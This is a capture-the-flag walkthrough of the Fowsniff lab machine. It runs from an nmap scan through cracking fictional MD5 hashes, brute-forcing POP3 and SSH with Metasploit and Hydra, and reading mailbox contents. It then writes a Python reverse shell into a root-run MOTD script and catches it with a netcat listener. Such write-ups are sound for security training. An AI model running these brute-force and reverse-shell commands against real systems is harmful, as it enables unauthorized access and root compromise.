# Fowsniff CTF

Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!

This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!

This will be structured to go through what you need to do, step by step. Make sure you are connected to our network

Credit to berzerk0 for creating this machine. This machine is used here with the explicit permission of the creator <3.

# #2 - Using nmap, scan this machine. What ports are open?

*Hint: `nmap -A -p- -sV 10.10.137.20`*

Nmap discovers 4 open ports:

~~~
kali@kali:/data/Fowsniff_CTF$ nmap -Pn -sC -sV -A 10.10.137.20
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 17:53 CEST
Nmap scan report for 10.10.137.20
Host is up (0.044s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) TOP AUTH-RESP-CODE CAPA UIDL RESP-CODES USER PIPELINING
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: Pre-login LOGIN-REFERRALS ID ENABLE SASL-IR more have LITERAL+ post-login capabilities IMAP4rev1 listed OK AUTH=PLAINA0001 IDLE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.43 seconds
~~~

# #3 - Using the information from the open ports. Look around. What can you find?

Connecting to the web server reveals that the company has been attacked:

~~~
Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.

Client information was not affected.

Due to the strong possibility that employee information has been made publicly available, all employees have been instructed to change their passwords immediately.

The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.

We will return to full capacity after a service upgrade.
~~~

Searching for the Twitter account (@fowsniffcorp) refered to in the message leads to https://twitter.com/fowsniffcorp where we can find a tweet with a link to https://pastebin.com/NrAqVeeX.

Below is the content on Pastebin:

~~~
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!


mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!

Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

l8r n00bz!

B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.

Any similarities to actual people or entities is purely coincidental and occurred accidentally.
~~~

# #4 - Using Google, can you find any public information about them?

*Hint: There is a pastebin with all of the company employees emails and hashes.*

The content discloses email addresses and password hashes.

~~~
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
~~~

# #5 - Can you decode these md5 hashes? You can even use sites like hashkiller to decode them.

Using https://hashes.com/en/decrypt/hash, we can retrieve 8 passwords out of 9:

~~~
Email | MD5 hash | password
---|---|---
mauer@fowsniff | 8a28a94a588a95b80163709ab4313aa4 | mailcall
mustikka@fowsniff | ae1644dac5b77c0cf51e0d26ad6d7e56 | bilbo101
tegel@fowsniff | 1dc352435fecca338acfd4be10984009 | apples01
baksteen@fowsniff | 19f5af754c31f1e2651edde9250d69bb | skyler22
seina@fowsniff | 90dc16d47114aa13671c697fd506cf26 | scoobydoo2
stone@fowsniff | a92b8a29ef1183192e3d35187e0cfabd | -
mursten@fowsniff | 0e9588cb62f4b6f27e33d449e2ba0b3b | carp4ever
parede@fowsniff | 4d6e42f56e127803285a0a7649b5ab11 | orlando12
sciana@fowsniff | f7fd98d380735e859f8b2ffbbede5a7e | 07011972
~~~

# #6 - Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?

*Hint: In metasploit there is a packages called: auxiliary/scanner/pop3/pop3_login where you can enter all the usernames and passwords you found to brute force this machines pop3 service.*

We can use Metasploit's `pop3_login` module to brute force the POP3 service using the credentials found previously.

~~~
kali@kali:/data/Fowsniff_CTF/files$ msfconsole -q
[*] Starting persistent handler(s)...
msf5 > use auxiliary/scanner/pop3/pop3_login 
msf5 auxiliary(scanner/pop3/pop3_login) > show options

Module options (auxiliary/scanner/pop3/pop3_login):

   Name              Current Setting                                                    Required  Description
   ----              ---------------                                                    --------  -----------
   BLANK_PASSWORDS   false                                                              no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                  yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                              no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                              no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                              no        Add all users in the current database to the list
   PASSWORD                                                                             no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  no        The file that contains a list of probable passwords.
   RHOSTS                                                                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             110                                                                yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                                              yes       Stop guessing when a credential works for a host
   THREADS           1                                                                  yes       The number of concurrent threads (max one per host)
   USERNAME                                                                             no        A specific username to authenticate as
   USERPASS_FILE                                                                        no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                              no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/unix_users.txt      no        The file that contains a list of probable users accounts.
   VERBOSE           true                                                               yes       Whether to print output for all attempts

msf5 auxiliary(scanner/pop3/pop3_login) > set rhost 10.10.137.20
rhost => 10.10.137.20
msf5 auxiliary(scanner/pop3/pop3_login) > set user_file /data/Fowsniff_CTF/files/usernames.txt
user_file => /data/Fowsniff_CTF/files/usernames.txt
msf5 auxiliary(scanner/pop3/pop3_login) > set pass_file /data/Fowsniff_CTF/files/passwords.txt
pass_file => /data/Fowsniff_CTF/files/passwords.txt
msf5 auxiliary(scanner/pop3/pop3_login) > run

[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mauer:mailcall', '-ERR [AUTH] Authentication failed.'
[!] 10.10.137.20:110      - No active DB -- Credential data will not be saved!
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mauer:bilbo101', '-ERR [AUTH] Authentication failed.'
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mauer:apples01', '-ERR [AUTH] Authentication failed.'
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mauer:skyler22', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mauer:scoobydoo2', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mauer:carp4ever', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mauer:orlando12', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mauer:07011972', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mustikka:mailcall', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mustikka:bilbo101', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mustikka:apples01', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mustikka:skyler22', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mustikka:scoobydoo2', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mustikka:carp4ever', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mustikka:orlando12', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'mustikka:07011972', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'tegel:mailcall', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'tegel:bilbo101', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'tegel:apples01', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'tegel:skyler22', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'tegel:scoobydoo2', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'tegel:carp4ever', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'tegel:orlando12', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'tegel:07011972', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'baksteen:mailcall', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'baksteen:bilbo101', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'baksteen:apples01', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'baksteen:skyler22', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'baksteen:scoobydoo2', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'baksteen:carp4ever', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'baksteen:orlando12', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'baksteen:07011972', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'seina:mailcall', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'seina:bilbo101', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'seina:apples01', ''
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'seina:skyler22', ''
[+] 10.10.137.20:110      - 10.10.137.20:110 - Success: 'seina:scoobydoo2' '+OK Logged in.  '
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'stone:mailcall', '-ERR [AUTH] Authentication failed.'
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'stone:bilbo101', '-ERR [AUTH] Authentication failed.'
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'stone:apples01', '-ERR [AUTH] Authentication failed.'
[-] 10.10.137.20:110      - 10.10.137.20:110 - Failed: 'stone:skyler22', ''
~~~

However, Hydra is faster:

~~~
kali@kali:/data/Fowsniff_CTF/files$ hydra -L usernames.txt -P passwords.txt pop3://10.10.137.20
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-03 19:05:30
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 72 login tries (l:9/p:8), ~5 tries per task
[DATA] attacking pop3://10.10.137.20:110/
[110][pop3] host: 10.10.137.20   login: seina   password: scoobydoo2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-03 19:06:24
~~~

We confirm that 1 account is still valid: `seina:scoobydoo2`

# #7 - What was seina's password to the email service?

Answer: `scoobydoo2`

# #8 - Can you connect to the pop3 service with her credentials? What email information can you gather?

*Hint: Use netcat with the port 110 to view her emails. `nc <ip> 110`*

Let's connect to the POP3 service. We successfully connect as seina and find 2 emails.

~~~
$ telnet 10.10.137.20 110
Trying 10.10.137.20...
Connected to 10.10.137.20.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
user seina
+OK
pass scoobydoo2
+OK Logged in.
list
+OK 2 messages:
1 1622
2 1280
.
~~~

First email:

~~~
retr 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
	id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.
~~~

Second email:

~~~
retr 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
	id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

.
~~~

# #9 - Looking through her emails, what was a temporary password set for her?

Answer: `S1ck3nBluff+secureshell`

# #10 - In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.

Extracting the list of recipients of the email, we can use hydra to confirm what user has not changed the password:

~~~
kali@kali:/data/Fowsniff_CTF/files$ hydra -L sshusers.txt -p S1ck3nBluff+secureshell ssh://10.10.137.20
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-03 20:14:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task
[DATA] attacking ssh://10.10.137.20:22/
[22][ssh] host: 10.10.137.20   login: baksteen   password: S1ck3nBluff+secureshell
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-03 20:14:47
~~~

We can now connect as `baksteen` against the SSH service:

~~~
$ ssh baksteen@10.10.137.20
~~~

# #11 - Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?

*Hint: cube.sh*

Baksteen belongs to the `users` group. Listing the files owned by this group reveals an interesting file (a shell script):

~~~
baksteen@fowsniff:~$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
baksteen@fowsniff:~$ find / -type f -group users 2>/dev/null
/opt/cube/cube.sh
[REDACTED]
~~~

The script `/opt/cube/cube.sh` is interesting because it displays the banner that is displayed when we connect to the SSH service. Besides, we can modify it.

~~~
kali@kali:/data/Fowsniff_CTF/files$ ssh baksteen@10.10.137.20
baksteen@10.10.137.20's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
~~~

This means that we can replace its content with a reverse shell.


# #12 - Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?

We can get a python reverse shell from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Let's replace the content of `/opt/cube/cube.sh` with this code:

~~~
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
~~~

# #13

**If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in `/etc/update-motd.d/` file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!**

*Hint: Run the cube file to the motd.d file.*

We can confirm that the `/opt/cube/cube.sh` script is present in `/etc/update-motd.d/00-header`. The `motd` (Message of the Day) daemon is responsible for displaying a message on an SSH connection and it is executed by `root`.

~~~
baksteen@fowsniff:/etc/update-motd.d$ grep cube *
00-header:sh /opt/cube/cube.sh
~~~

# #14 - Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!

Let's disconnect from our SSH session, and open a listener (adapt the port to fit with the one mentioned in the reverse shell):

~~~
$ rlwrap nc -nlvp 4444
~~~

Now, when we reconnect with SSH, we have a root shell in listener window:

~~~
kali@kali:/data/Fowsniff_CTF/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.137.20] 38714
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -la
total 28
drwx------  4 root root 4096 Mar  9  2018 .
drwxr-xr-x 22 root root 4096 Mar  9  2018 ..
-rw-r--r--  1 root root 3117 Mar  9  2018 .bashrc
drwxr-xr-x  2 root root 4096 Mar  9  2018 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  5 root root 4096 Mar  9  2018 Maildir
-rw-r--r--  1 root root  582 Mar  9  2018 flag.txt
# cat flag.txt
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
~~~
